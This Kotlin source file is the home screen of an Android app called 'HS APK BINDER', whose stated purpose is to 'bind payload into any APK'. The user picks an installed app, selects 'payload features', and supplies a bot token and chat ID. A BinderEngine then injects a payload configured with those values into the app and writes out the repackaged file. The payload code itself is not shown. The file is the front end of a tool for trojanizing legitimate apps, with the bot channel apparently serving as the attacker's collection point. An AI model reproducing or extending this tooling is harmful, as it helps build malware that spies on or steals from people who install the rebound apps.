package Com.devhs.apkbinder.ui.home

import android.content.ClipboardManager
import android.content.Context
import android.content.pm.ApplicationInfo
import android.net.Uri
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.heightIn
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Add
import androidx.compose.material.icons.filled.Android
import androidx.compose.material.icons.filled.ContentPaste
import androidx.compose.material3.AlertDialog
import androidx.compose.material3.FilledIconButton
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButtonDefaults
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.OutlinedTextFieldDefaults
import androidx.compose.material3.SmallFloatingActionButton
import androidx.compose.material3.Text
import androidx.compose.material3.TextButton
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.collectAsState
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateListOf
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.rememberCoroutineScope
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.asImageBitmap
import androidx.compose.ui.graphics.painter.BitmapPainter
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.documentfile.provider.DocumentFile
import Com.devhs.apkbinder.binder.BinderEngine
import Com.devhs.apkbinder.data.Feature
import Com.devhs.apkbinder.data.LogLevel
import Com.devhs.apkbinder.data.LogLine
import Com.devhs.apkbinder.data.PayloadConfig
import Com.devhs.apkbinder.data.Prefs
import Com.devhs.apkbinder.ui.components.FeatureCheck
import Com.devhs.apkbinder.ui.components.GlowCard
import Com.devhs.apkbinder.ui.components.NeonGradientButton
import Com.devhs.apkbinder.ui.components.TerminalConsole
import Com.devhs.apkbinder.ui.theme.BgElevated
import Com.devhs.apkbinder.ui.theme.BgSurface
import Com.devhs.apkbinder.ui.theme.NeonBlue
import Com.devhs.apkbinder.ui.theme.NeonTeal
import Com.devhs.apkbinder.ui.theme.StrokeSoft
import Com.devhs.apkbinder.ui.theme.TextMuted
import Com.devhs.apkbinder.ui.theme.TextPrimary
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

@Composable
fun HomeScreen() {
    val ctx = LocalContext.current
    val scope = rememberCoroutineScope()

    var apkUri by remember { mutableStateOf<Uri?>(null) }
    var apkLabel by remember { mutableStateOf("") }
    var activityInput by remember { mutableStateOf("") }
    val selected = remember { mutableStateListOf<Feature>() }
    val logs = remember { mutableStateListOf<LogLine>() }
    var busy by remember { mutableStateOf(false) }
    var showApps by remember { mutableStateOf(false) }

    val token by Prefs.token(ctx).collectAsState(initial = "")
    val chatId by Prefs.chatId(ctx).collectAsState(initial = "")

    fun log(level: LogLevel, message: String) {
        val stamp = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
        logs.add(LogLine(level, message, stamp))
    }

    val pickApk = rememberLauncherForActivityResult(ActivityResultContracts.OpenDocument()) { uri ->
        if (uri != null) {
            apkUri = uri
            apkLabel = uri.lastPathSegment ?: "selected.apk"
            log(LogLevel.SUCCESS, "APK selected")
        }
    }

    val pickDir = rememberLauncherForActivityResult(ActivityResultContracts.OpenDocumentTree()) { dir ->
        val uri = apkUri
        if (dir == null) {
            log(LogLevel.WARN, "Output folder cancelled")
            return@rememberLauncherForActivityResult
        }
        if (uri == null) {
            log(LogLevel.ERROR, "Select APK first")
            return@rememberLauncherForActivityResult
        }
        if (token.isBlank() || chatId.isBlank()) {
            log(LogLevel.ERROR, "Set Bot Token and Chat ID in Settings")
            return@rememberLauncherForActivityResult
        }

        busy = true
        scope.launch {
            try {
                val dirDoc = DocumentFile.fromTreeUri(ctx, dir)
                    ?: throw IllegalStateException("Invalid output folder")
                BinderEngine(ctx).bind(
                    source = uri,
                    activity = activityInput.trim(),
                    features = selected.toSet(),
                    config = PayloadConfig(token, chatId, selected.map { it.key }, null),
                    outDir = dirDoc,
                    onLog = { level, message -> log(level, message) }
                )
            } catch (t: Throwable) {
                log(LogLevel.ERROR, t.message ?: "Binding failed")
            } finally {
                busy = false
            }
        }
    }

    Column(
        Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState())
            .padding(horizontal = 16.dp)
    ) {
        Spacer(Modifier.height(18.dp))
        Text("HS APK BINDER", color = NeonTeal, fontWeight = FontWeight.Black, fontSize = 22.sp, letterSpacing = 3.sp)
        Text("Bind payload into any APK", color = TextMuted, fontSize = 12.sp)
        Spacer(Modifier.height(18.dp))

        GlowCard(onClick = { if (!busy) showApps = true }) {
            Row(verticalAlignment = Alignment.CenterVertically) {
                Icon(Icons.Default.Android, null, tint = NeonTeal)
                Spacer(Modifier.width(12.dp))
                Column(Modifier.weight(1f)) {
                    Text("Select Apk", color = TextPrimary, fontWeight = FontWeight.SemiBold, fontSize = 16.sp)
                    Text(
                        if (apkUri == null) "Tap to choose installed app" else apkLabel,
                        color = if (apkUri == null) TextMuted else NeonTeal,
                        fontSize = 12.sp,
                        maxLines = 1
                    )
                }
                SmallFloatingActionButton(
                    onClick = { pickApk.launch(arrayOf("application/vnd.android.package-archive")) },
                    containerColor = NeonBlue,
                    contentColor = Com.devhs.apkbinder.ui.theme.BgDeep
                ) { Icon(Icons.Default.Add, null) }
            }
        }

        Spacer(Modifier.height(14.dp))

        Row(verticalAlignment = Alignment.CenterVertically) {
            OutlinedTextField(
                value = activityInput,
                onValueChange = { activityInput = it },
                placeholder = { Text("Paste Your APK Path / Activity Here...", fontSize = 12.sp, color = TextMuted) },
                singleLine = true,
                modifier = Modifier.weight(1f),
                shape = RoundedCornerShape(14.dp),
                colors = OutlinedTextFieldDefaults.colors(
                    focusedBorderColor = NeonTeal,
                    unfocusedBorderColor = StrokeSoft,
                    focusedTextColor = TextPrimary,
                    unfocusedTextColor = TextPrimary
                )
            )
            Spacer(Modifier.width(8.dp))
            FilledIconButton(
                onClick = {
                    val cm = ctx.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                    val text = cm.primaryClip?.getItemAt(0)?.text?.toString()
                    if (!text.isNullOrBlank()) {
                        activityInput = text
                        log(LogLevel.INFO, "Pasted from clipboard")
                    }
                },
                colors = IconButtonDefaults.filledIconButtonColors(
                    containerColor = BgElevated,
                    contentColor = NeonTeal
                )
            ) { Icon(Icons.Default.ContentPaste, null) }
        }

        Spacer(Modifier.height(16.dp))
        Text("PAYLOAD FEATURES", color = TextMuted, fontSize = 10.sp, letterSpacing = 2.sp)
        Spacer(Modifier.height(8.dp))

        Feature.entries.forEach { feature ->
            FeatureCheck(
                label = feature.label,
                checked = selected.contains(feature)
            ) {
                if (selected.contains(feature)) selected.remove(feature) else selected.add(feature)
            }
            Spacer(Modifier.height(8.dp))
        }

        Spacer(Modifier.height(8.dp))
        NeonGradientButton(
            text = if (busy) "BINDING..." else "BINDING NOW",
            enabled = !busy,
            modifier = Modifier.fillMaxWidth()
        ) {
            if (apkUri == null) {
                log(LogLevel.ERROR, "Select APK First...")
            } else if (selected.isEmpty()) {
                log(LogLevel.ERROR, "Select at least one feature")
            } else if (token.isBlank() || chatId.isBlank()) {
                log(LogLevel.ERROR, "Bot Token / Chat ID missing")
            } else {
                log(LogLevel.INFO, "Choose output directory...")
                pickDir.launch(null)
            }
        }

        Spacer(Modifier.height(18.dp))
        TerminalConsole(logs = logs, onClear = { logs.clear() })
        Spacer(Modifier.height(24.dp))
    }

    if (showApps) {
        AppPickerDialog(
            onDismiss = { showApps = false },
            onPick = { info ->
                apkUri = Uri.fromFile(File(info.sourceDir))
                apkLabel = info.loadLabel(ctx.packageManager).toString()
                showApps = false
                log(LogLevel.SUCCESS, "APK selected: " + apkLabel)
            }
        )
    }
}

@Composable
private fun AppPickerDialog(onDismiss: () -> Unit, onPick: (ApplicationInfo) -> Unit) {
    val ctx = LocalContext.current
    var apps by remember { mutableStateOf<List<ApplicationInfo>>(emptyList()) }
    var query by remember { mutableStateOf("") }

    LaunchedEffect(Unit) {
        apps = withContext(Dispatchers.IO) {
            ctx.packageManager.getInstalledApplications(0)
                .filter { it.sourceDir != null && it.packageName != ctx.packageName }
                .sortedBy { it.loadLabel(ctx.packageManager).toString().lowercase() }
        }
    }

    val filtered = apps.filter {
        query.isBlank() || it.loadLabel(ctx.packageManager).toString().contains(query, true)
    }

    AlertDialog(
        onDismissRequest = onDismiss,
        containerColor = BgSurface,
        title = { Text("Select Installed App", color = NeonTeal) },
        text = {
            Column {
                OutlinedTextField(
                    value = query,
                    onValueChange = { query = it },
                    singleLine = true,
                    placeholder = { Text("Search...", fontSize = 12.sp) },
                    modifier = Modifier.fillMaxWidth()
                )
                Spacer(Modifier.height(10.dp))
                LazyColumn(Modifier.heightIn(max = 380.dp), verticalArrangement = Arrangement.spacedBy(4.dp)) {
                    items(filtered) { info ->
                        Row(
                            Modifier
                                .fillMaxWidth()
                                .clip(RoundedCornerShape(10.dp))
                                .padding(8.dp),
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            Icon(
                                BitmapPainter(
                                    android.graphics.Bitmap.createScaledBitmap(
                                        info.loadIcon(ctx.packageManager).toBitmap(), 64, 64, true
                                    ).asImageBitmap()
                                ),
                                null,
                                modifier = Modifier.size(32.dp)
                            )
                            Spacer(Modifier.width(10.dp))
                            Column(Modifier.weight(1f)) {
                                Text(info.loadLabel(ctx.packageManager).toString(), color = TextPrimary, fontSize = 14.sp)
                                Text(info.packageName, color = TextMuted, fontSize = 10.sp, maxLines = 1)
                            }
                            TextButton(onClick = { onPick(info) }) { Text("Pick", color = NeonTeal) }
                        }
                    }
                }
            }
        },
        confirmButton = { TextButton(onClick = onDismiss) { Text("Close", color = TextMuted) } }
    )
}
